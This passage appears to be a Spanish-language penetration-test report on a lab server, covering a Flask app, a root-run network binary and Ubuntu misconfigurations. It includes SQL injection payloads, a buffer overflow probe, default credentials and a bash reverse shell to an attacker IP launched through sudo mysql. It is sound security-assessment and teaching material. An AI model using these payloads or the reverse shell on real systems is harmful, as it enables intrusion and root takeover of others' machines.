- **Escalada de privilegios:** Acceso a recursos del servidor con los permisos de la aplicación
- **Lectura de archivos sensibles:** Acceso al sistema de archivos
- **Compromiso total del servidor**
- **Instalación de backdoors permanentes**

### 3. SQL Injection

#### Descripción

La aplicación es vulnerable a SQL Injection en el formulario de login. Esto se evidencia por el comportamiento diferenciado ante distintos inputs.

#### Pruebas Realizadas

**Payload malicioso:**

```sql
a' OR '1'='1' --
```

Con este payload como usuario y cualquier contraseña, la aplicación devuelve un "Internal Server Error" en lugar del mensaje normal de credenciales incorrectas.

![Error con SQL Injection](photos/Pasted%20image%2020251204183003.png)

**Login normal fallido:**

Con credenciales incorrectas normales, la aplicación responde adecuadamente indicando que el login ha fallado.

![Login fallido normal](photos/Pasted%20image%2020251204183035.png)

#### Confirmación mediante ORDER BY

Utilizando la técnica de `ORDER BY` para enumerar columnas:

```sql
a' ORDER BY 6-- 
```

La aplicación genera un Internal Server Error cuando alcanzamos la columna 6, indicando que la consulta SQL tiene 5 columnas.

![Confirmación con ORDER BY](photos/Pasted%20image%2020251204184014.png)

#### Impacto

- Extracción completa de la base de datos
- Bypass de autenticación
- Modificación o eliminación de datos
- Posible escalada a RCE mediante funciones de MySQL
- Lectura de archivos del sistema con `LOAD_FILE()`

### 4. Configuración Inadecuada de Cookies

#### Descripción

A diferencia de App1, App3 tiene correctamente configurado el atributo HttpOnly, lo cual ayuda a prevenir el acceso a las cookies desde JavaScript. Sin embargo, presenta problemas en:

**Secure flag:** No está configurado, permitiendo la transmisión de cookies sobre HTTP sin cifrar.

**SameSite:** No está correctamente configurado, dejando la aplicación vulnerable a CSRF.

#### Impacto

- Intercepción de cookies en conexiones HTTP
- Ataques CSRF facilitados
- Parcialmente vulnerable a robo de sesión

### 5. Session Timeout Inadecuado

#### Descripción

Similar a las otras aplicaciones, en App3 encontramos:

```
Connection: Keep-Alive
```

Las sesiones permanecen activas indefinidamente sin expiración automática.

#### Impacto

- Sesiones no expiran tras inactividad
- Mayor ventana temporal para explotación de sesiones comprometidas
- Riesgo en equipos compartidos

### 6. Session Fixation

#### Descripción

Al analizar las cookies de sesión, observamos que la aplicación asigna valores predeterminados a las cookies antes incluso de la autenticación del usuario. Esto permite a un atacante forzar una sesión específica a una víctima.

#### Ataque Típico

1. Atacante obtiene un session ID válido
2. Fuerza a la víctima a usar ese session ID (mediante XSS, phishing, etc.)
3. Víctima se autentica con el session ID del atacante
4. Atacante tiene acceso a la sesión autenticada

#### Impacto

- Robo de sesión sin necesidad de interceptar credenciales
- Bypass de autenticación
- Acceso no autorizado a cuentas de usuarios

### 7. CSRF Habilitado

#### Descripción

Al revisar el archivo de configuración `configuration.py`, encontramos:

```python
CSRF_ENABLED = True
```

Si bien tener CSRF habilitado generalmente es una medida de seguridad, en este contexto específico y combinado con otras vulnerabilidades, la implementación es deficiente y puede ser explotable.

#### Impacto

Cross-Site Request Forgery permite:
- Forzar acciones no deseadas en usuarios autenticados
- Modificación de datos sin consentimiento
- Ejecución de operaciones privilegiadas sin autorización
- Aprovechamiento de la confianza del servidor en el navegador del usuario

### 8. Secret Key Expuesta

#### Descripción

La clave secreta de Flask, utilizada para firmar cookies y tokens CSRF, está visible en el código fuente sin cifrar. Esta clave es crítica para la seguridad de la aplicación.

```python
SECRET_KEY = 'mi_clave_super_secreta_123'
```

#### Impacto

Con acceso a la secret key, un atacante puede:
- Forjar cookies de sesión válidas
- Crear tokens CSRF válidos
- Suplantar cualquier usuario
- Modificar datos firmados por la aplicación
- Compromiso total del sistema de autenticación

### 9. Credenciales en Texto Plano (Base de Datos)

#### Descripción

Similar a App2, las credenciales en la base de datos de App3 están almacenadas sin ningún tipo de cifrado o hash. Esto incluye:
- Contraseñas completas
- Nombres de usuario
- Información de perfil

#### Impacto

- Compromiso inmediato de todas las cuentas si la BD es accedida
- Sin protección adicional contra brechas de seguridad
- Usuarios expuestos a robo de identidad
- Posible uso de credenciales en otros servicios (credential stuffing)

### 10. Tráfico sin Cifrar (HTTP)

#### Descripción

App3 tampoco implementa HTTPS, operando exclusivamente sobre HTTP.

#### Impacto

- Interceptación de credenciales
- Robo de cookies de sesión
- Man-in-the-Middle attacks
- Modificación de tráfico en tránsito
- Sin verificación de autenticidad del servidor

---

## Puerto 5555 (App5) - Buffer Overflow

### Análisis Preliminar

#### Identificación del Servicio

Revisando los procesos en ejecución en el sistema:

```bash
ps aux | grep -i app
```

Encontramos:

```bash
root  1843  0.0  0.0  9288  3788 ?  Ss  11:42  0:00 socat TCP-LISTEN:5555,fork,reuseaddr, exec:/opt/app5/app5,stderr
```

Este proceso indica que hay un servicio personalizado ejecutándose en el puerto 5555, manejado por `socat` que ejecuta el binario `/opt/app5/app5`.

#### Análisis del Binario

```bash
file /opt/app5/app5
```

Resultado:

```
/opt/app5/app5: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), 
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, 
BuildID[sha1]=6794c42ba9fce64417f4fc13d5be2017ef50bbb0, 
for GNU/Linux 3.2.0, with debug_info, not stripped
```

**Permisos del archivo:**

```bash
ls -la /opt/app5/app5
-rwxr-xr-x 1 root root 15688 Sep 29 14:55 /opt/app5/app5
```

**Observaciones críticas:**
- Ejecutable de 64 bits
- Usa librerías compartidas
- **Tiene información de debug** (facilita análisis)
- **No está stripped** (símbolos presentes)
- **Ejecutado como root** (si se explota = privilegios root)

### Revisión del Código Fuente

![Código fuente de app5](photos/Pasted%20image%2020251118122743.png)

El código muestra el uso de `scanf()` para leer entrada del usuario con un buffer de 512 bytes, una práctica potencialmente peligrosa.

### Análisis con GDB

```bash
gdb /opt/app5/app5
info functions
disas main
```

![Funciones disponibles](photos/Pasted%20image%2020251118120931.png)
![Desensamblado de main](photos/Pasted%20image%2020251118120436.png)
![Stack configuration](photos/Pasted%20image%2020251118120524.png)

**Hallazgos clave:**
- `scanf()` se usa para leer entrada sin validación de longitud
- Buffer de 512 bytes en el stack
- La función `main` es visible y analizable
- `GNU_STACK` sugiere que podríamos ejecutar shellcode

### Prueba de Buffer Overflow

**Interacción normal:**

```bash
nc localhost 5555
```

El servicio responde con un prompt esperando entrada.

**Prueba de overflow:**

```bash
python3 -c "print('A' * 600)" | nc localhost 5555
```

![Confirmación de buffer overflow](photos/Pasted%20image%2020251118121221.png)

El servicio no responde de manera normal, confirmando la vulnerabilidad de buffer overflow.

### Format String Vulnerability

Adicionalmente, durante las pruebas descubrimos que el binario es vulnerable a **Format String attacks**. Esto se debe al uso incorrecto de funciones como `printf()` con datos controlados por el usuario.

#### Impacto de Buffer Overflow + Format String

Esta combinación de vulnerabilidades permite:

1. **Buffer Overflow:**
   - Sobrescribir el return address en el stack
   - Ejecutar shellcode inyectado
   - Obtener shell como root (proceso corre como root)

2. **Format String:**
   - Leer memoria arbitraria del proceso
   - Escribir en ubicaciones de memoria específicas
   - Bypassear protecciones como ASLR
   - Extraer información sensible (direcciones, datos)

#### Explotación Potencial

Con acceso root al ejecutar el exploit exitosamente:
- Control total del sistema
- Instalación de backdoors permanentes
- Modificación de cualquier archivo
- Escalada de privilegios inmediata

---

## Vulnerabilidades del Sistema (Ubuntu)

### 1. Permisos Sudo Mal Configurados (CRÍTICO)

#### Descripción

Al ejecutar `sudo -l` con el usuario `user`, observamos:

![Configuración de sudo](photos/Pasted%20image%2020251204194214.png)

La salida muestra:

```
User user may run the following commands on user-VMware-Virtual-Platform:
    (ALL : ALL) ALL
```

Esto significa que el usuario `user` puede ejecutar **cualquier comando** como **cualquier usuario** en **cualquier grupo** sin restricciones.

#### Impacto

Esta configuración es extremadamente peligrosa porque:
- Un usuario sin privilegios tiene acceso completo al sistema
- Puede ejecutar comandos como root sin restricciones
- Puede modificar archivos críticos del sistema
- Puede crear usuarios con privilegios
- Puede instalar malware persistente
- **Anula completamente el modelo de seguridad de Linux**

### 2. Permisos MySQL Excesivos

#### Descripción

El usuario `user` tiene permisos para ejecutar MySQL con privilegios de root:

```bash
sudo mysql
```

Una vez dentro de MySQL, puede ejecutar comandos del sistema:

```sql
system bash -c "bash -i >& /dev/tcp/192.168.207.1/4444 0>&1"
```

#### Reverse Shell a través de SQL

**En la máquina atacante (listener):**

```bash
ncat -nlvp 4444
```

**En el servidor (vía SSH):**

```bash
ssh user@192.168.207.130
sudo mysql
system bash -c "bash -i >& /dev/tcp/192.168.207.1/4444 0>&1"
```

![Reverse shell vía MySQL](photos/Pasted%20image%2020251203094003.png)

La shell resultante tiene privilegios de **root**, proporcionando control total del sistema.

#### Impacto

- Ejecución de comandos del sistema operativo desde MySQL
- Escalada de privilegios inmediata a root
- Bypass completo de controles de acceso
- Persistencia fácil mediante backdoors
- Acceso a toda la información del sistema

### 3. Ausencia de Restricciones en Ejecución de Comandos

#### Descripción

Revisando el archivo `/etc/sudoers`:

```bash
cat /etc/sudoers
```

No existen restricciones sobre qué usuarios pueden ejecutar qué comandos. Cualquier persona que obtenga acceso puede ejecutar comandos privilegiados.

#### Impacto

- Sin segregación de responsabilidades
- No hay principio de mínimo privilegio
- Facilita movimiento lateral en caso de compromiso
- Dificulta auditorías de seguridad

### 4. Ausencia de Antivirus/Antimalware

#### Descripción

El sistema no tiene ningún software de protección contra malware instalado o configurado. Esto se evidencia por:
- No hay procesos de antivirus activos
- No hay protección contra uploads maliciosos en App1
- Archivos ejecutables pueden ser subidos sin escaneo

#### Impacto

- Malware puede ejecutarse sin detección
- Uploads maliciosos en App1 no son bloqueados
- Backdoors pueden persistir indefinidamente
- Sin protección contra ransomware, spyware, etc.
- Sistema completamente expuesto a amenazas de malware

### 5. Modo Debug en Producción

#### Descripción

Revisando los backups descargados, específicamente en App1:

Ruta: `/var/www/html/app1/app1/settings/local.py`

El archivo de configuración local muestra:

```python
DEBUG = True
```

#### Impacto

Con debug activado en producción:
- Exposición de rutas completas del sistema
- Revelación de consultas SQL ejecutadas
- Stack traces completos visibles
- Variables de entorno expuestas
- Información de versiones de librerías
- Facilita enormemente el reconocimiento para ataques

### 6. Sesión Anónima FTP (Teórico)

#### Descripción

Aunque el escaneo de Nmap indica que el acceso anónimo FTP está deshabilitado, la documentación y análisis sugiere que históricamente o en configuraciones anteriores, el servidor FTP permitía acceso anónimo. Esto permitiría conectarse al servicio FTP sin proporcionar credenciales.

#### Escenario de Explotación

Si el acceso anónimo estuviera habilitado:

```bash
ftp 192.168.207.130
Name: anonymous
Password: [cualquier email]
```

Esto daría acceso al sistema de archivos FTP sin verificación de identidad.

#### Impacto Potencial

En caso de estar mal configurado:
- **Robo de información:** Descarga de archivos sensibles sin autenticación
- **Upload de malware:** Subida de archivos maliciosos al servidor
- **Reconocimiento:** Exploración de estructura de directorios y archivos
- **Base para otros ataques:** Información recopilada para ataques dirigidos
- **Control del servidor:** Posible ejecución de comandos secundarios
- **Movimiento lateral:** Punto de entrada para comprometer otros sistemas

Aunque actualmente deshabilitado, representa un error de configuración común que debe ser monitoreado.

---

## Vulnerabilidades Transversales

### 1. Tráfico Sin Cifrar (HTTP vs HTTPS)

#### Descripción

**Ninguna de las tres aplicaciones** implementa HTTPS:
- App1 (Django): http://app1.unie
- App2 (PHP/API): http://app2.unie  
- App3 (Flask): http://app3.unie

Todo el tráfico viaja en texto plano sin cifrado.

#### Impacto Combinado

En un entorno sin HTTPS:

1. **Interceptación de credenciales:**
   - Todos los logins son visibles
   - Contraseñas capturadas en texto plano
   - Tokens de sesión expuestos

2. **Man-in-the-Middle (MITM):**
   - Modificación de tráfico en tránsito
   - Inyección de código malicioso
   - Redirección a sitios falsos

3. **Falta de autenticación del servidor:**
   - Sin certificados SSL/TLS
   - Usuarios no pueden verificar legitimidad
   - Facilita ataques de phishing

4. **Exposición de datos sensibles:**
   - APIs exponen información sin cifrar
   - Sesiones pueden ser replicadas
   - Datos de usuarios visibles en la red

### 2. Secret Keys Expuestas

#### Ubicaciones

- **App1:** En archivos de configuración de Django
- **App2:** En archivos PHP de configuración
- **App3:** En `configuration.py`

Todas las claves secretas están:
- En texto plano
- Versionadas (si usan Git)
- Accesibles en los backups del puerto 9001

#### Impacto Universal

Con acceso a las secret keys:
- Firma de tokens de sesión falsos
- Generación de cookies válidas
- Bypass de protecciones CSRF
- Suplantación de usuarios
- **Compromiso total de los sistemas de autenticación**

### 3. Credenciales Predeterminadas

#### Instancias Encontradas

Todas las aplicaciones y servicios usan credenciales por defecto:

- **App1 Admin:** admin/admin
- **App2 Admin:** admin@app2.unie/admin
- **MySQL/MariaDB:** usuarios con contraseñas débiles
- **SSH:** credenciales estándar
- **FTP:** aunque deshabilitado, usa configuración predeterminada

#### Impacto

- Extremadamente vulnerable a fuerza bruta
- Scripts automatizados pueden comprometer el sistema
- Facilita acceso inicial a atacantes
- No hay resistencia ante ataques básicos

---

## Conclusiones Generales

### Resumen Ejecutivo

Este análisis ha revelado un panorama de seguridad extremadamente preocupante. Las tres aplicaciones web presentan vulnerabilidades críticas que, en conjunto, permiten:

1. **Acceso no autorizado completo** (RCE, SQL Injection, credenciales débiles)
2. **Compromiso de datos** (backups expuestos, DB en texto plano)
3. **Escalada de privilegios** (configuración sudo, MySQL con permisos excesivos)
4. **Persistencia** (múltiples backdoors posibles)

### Vectores de Ataque Principales

1. **Puerto 9001** → Acceso a código fuente y esquemas
2. **App1** → RCE vía Pickle
3. **App2** → PHP Type Juggling + SQL Injection
4. **App3** → SSTI + SQL Injection
5. **Puerto 5555** → Buffer Overflow como root
6. **Sistema** → Sudo mal configurado = root inmediato

### Cadena de Ataque Típica

```
1. Escaneo (nmap) → Puerto 9001 descubierto
2. Descarga de backups → Código fuente obtenido
3. Análisis de vulnerabilidades → RCE/SQLi/SSTI identificados
4. Explotación → Shell con privilegios de aplicación web
5. Escalada → sudo mal configurado = root
6. Persistencia → Backdoors instalados
7. Exfiltración → Todos los datos comprometidos
```

### Nivel de Riesgo General

**CRÍTICO** - El sistema está completamente comprometible con múltiples vectores de entrada y facilidades para mantener persistencia y escalar privilegios.

---

## Lecciones Aprendidas

1. **Configuración es tan importante como el código:** Muchas vulnerabilidades provienen de errores de configuración (debug=True, sudo mal configurado, HTTP en lugar de HTTPS).

2. **Defensa en profundidad:** Una sola vulnerabilidad crítica (como RCE o SQLi) puede comprometer todo el sistema si no hay capas adicionales de protección.

3. **Gestión de secretos:** Nunca hardcodear credenciales ni claves secretas en el código fuente.

4. **Validación de entrada:** Todas las vulnerabilidades de inyección (SQL, SSTI, Pickle) provienen de confiar en datos del usuario sin validación.

5. **Principio de mínimo privilegio:** Los permisos excesivos (sudo, MySQL) transforman vulnerabilidades menores en compromisos totales.

6. **Visibilidad del código:** Exponer backups o código fuente reduce dramáticamente la barrera de entrada para atacantes.

--- 
